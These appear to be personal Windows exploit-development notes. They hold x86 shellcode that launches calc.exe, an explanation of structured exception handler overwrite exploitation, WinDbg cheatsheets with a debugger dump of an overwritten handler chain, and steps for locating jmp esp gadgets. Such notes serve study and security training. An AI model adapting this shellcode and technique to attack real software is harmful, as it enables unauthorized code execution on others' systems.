# Windows Exploitation Notes

### Shellcode to spawn calc.exe
```python
shellcode = (
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0"
)
```

## Structured Exeception Handler (SEH) Exploitation
[SEH Tutorial](https://www.fuzzysecurity.com/tutorials/expDev/3.html)  
**SEH:** Located at ESP+8  
**nSEH:** Points towards next SEH block in the linked list  
**Structure**: buffer, EIP/RIP, nSEH, SEH

Overwrite SEH with a `POP POP RET` gadget, overwrite nSEH with code to be executed. nSEH can be used to jump to shellcode, with `jmp esp`.

**WinDbg Commands**
| Command                              | Explanation                                           |
|--------------------------------------|-------------------------------------------------------|
| `d fs:[0]`                           | Pointer to SEH chain (first block in SEH linked list) |
| `!exchain`                           | Display SEH chain                                     | 
  
SEH chain located at `0x0019f4cc`
```
0:000> d fs:[0]
0053:00000000  cc f4 19 00 00 00 1a 00-00 70 19 00 00 00 00 00 .........p......
0053:00000010  00 1e 00 00 00 00 00 00-00 a0 33 00 00 00 00 00 ..........3.....
0053:00000020  40 33 00 00 ec 53 00 00-00 00 00 00 a8 cf 68 06 @3...S........h.
0053:00000030  00 70 33 00 00 00 00 00-00 00 00 00 00 00 00 00 .p3.............
0053:00000040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000050  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000060  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0053:00000070  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
```

```
0:000> !exchain
0019f4cc: 43434343                   # SEH
Invalid exception stack at 42424242  # nSEH
```

## WinDbg Notes
### Cheatsheet
| Command                              | Example                                | Explanation                                   |
|--------------------------------------|----------------------------------------|-----------------------------------------------|
| lm                                   | `lm`                                   | List all loaded modules                       |
| d *address*                          | <code> d @esp <br> d 0x12345678 <code> | Display memory at address d @esp d 0x12345678 |
| s *start_addr* l *end_addr* *opcode* | `s 70000000 l ffffffff ff e4`          | Search memory for pattern                     |
| !exchain                             | `!exchain`                             | Display SEH chain                             |

### Searching for ROP Gadgets
The instruction to search for is `jmp esp` in this example.

* Attach the debugger to the process and wait for it to break. 
* Enter `a`
* Enter `jmp esp` and press **return**  
* Enter `u <address shown before jmp esp>`
* Search for the opcode using `s -b <start_addr> <end_addr> <opcode>`

![Finding ROP Gadgets](Images/ROPGadget.JPG?raw=true)
